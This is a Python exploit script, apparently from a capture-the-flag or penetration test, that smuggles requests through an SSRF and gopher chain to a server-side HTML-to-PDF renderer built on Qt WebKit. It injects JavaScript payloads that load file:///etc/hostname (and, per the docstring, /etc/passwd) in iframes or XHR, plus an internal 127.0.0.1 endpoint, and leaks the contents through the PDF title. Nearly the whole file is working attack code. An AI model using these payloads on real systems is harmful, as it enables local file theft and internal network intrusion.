#!/usr/bin/env python3
"""Read a local file through JavaScript inside the rendered page.

Script runs (document.title reached the PDF), and the iframe for file:///etc/passwd
loaded without error, so the classic Qt WebKit leak applies: every local file is the
same origin, so `iframe.contentDocument` is readable from the embedding page.

Each case writes what it learned into document.title, because /Title is plaintext
UTF-16 in the PDF - no font mapping needed. Onload handlers are used so the iframe has
actually finished before we read it.
"""
import base64
import html as H
import json
import re
import sys
import time
import urllib.parse

import gopher
import ssrf


def w(s):
    sys.stdout.buffer.write((str(s) + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


def render(content, timeout=90):
    # NOTE: the body is form-urlencoded, so "+" would decode to a space and break any
    # JavaScript that concatenates strings. Encode the value properly.
    body = "content=" + urllib.parse.quote(content, safe="")
    feed = gopher.gopher_raw("POST", "/report", body,
                             ["Content-Type: application/x-www-form-urlencoded"])
    st, pg = ssrf.get("/", feed=feed, timeout=timeout)
    m = re.search(r'<pre class="tape">(.*?)</pre>', pg, re.S)
    raw = H.unescape(urllib.parse.unquote(m.group(1))) if m else ""
    rest = raw.partition("\r\n\r\n")[2]
    try:
        obj = json.loads(rest)
    except Exception:
        return {"err": rest[:200]}
    pdf = base64.b64decode(obj["data"]) if obj.get("data") else b""
    titles = []
    for t in re.findall(rb"/Title \((.*?)\)", pdf, re.S):
        titles.append((t.decode("utf-16-be", "replace") if t[:2] == b"\xfe\xff"
                       else t.decode("latin-1", "replace")).lstrip("\ufeff"))
    return {"pdf": len(pdf), "title": titles}


CASES = [
    ("xhr file error",
     '<script>try{var x=new XMLHttpRequest();x.open("GET","file:///etc/hostname",false);'
     'x.send();document.title="OK:"+x.responseText;}catch(e){document.title="ERR:"+e;}</script>'),
    ("xhr http feed",
     '<script>try{var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1:8000/feed",false);'
     'x.send();document.title="OK2:"+String(x.responseText).slice(0,40);}catch(e){document.title="E2:"+e;}</script>'),
    ("iframe onload read",
     '<iframe src="file:///etc/hostname" onload="try{document.title='
     '\'HN:\'+this.contentDocument.body.textContent.trim();}catch(e){document.title=\'IFRAMEERR:\'+e;}"></iframe>'),
    ("iframe frames access",
     '<iframe src="file:///etc/hostname"></iframe>'
     '<script>document.title="PENDING";setTimeout(function(){try{'
     'document.title="F:"+window.frames[0].document.body.textContent.trim();}catch(e){'
     'document.title="FERR:"+e;}},50);</script>'),
    ("busy wait onload",
     '<iframe id="f" src="file:///etc/hostname"></iframe>'
     '<script>var n=0;function go(){try{var d=document.getElementById("f").contentDocument;'
     'document.title="B:"+(d&&d.body?d.body.textContent.trim():"null");}catch(e){'
     'document.title="BERR:"+e;}if(n++<40)setTimeout(go,50);};go();</script>'),
]

if __name__ == "__main__":
    for label, content in CASES:
        r = render(content)
        w("%-22s %s" % (label, r))
        time.sleep(1.2)
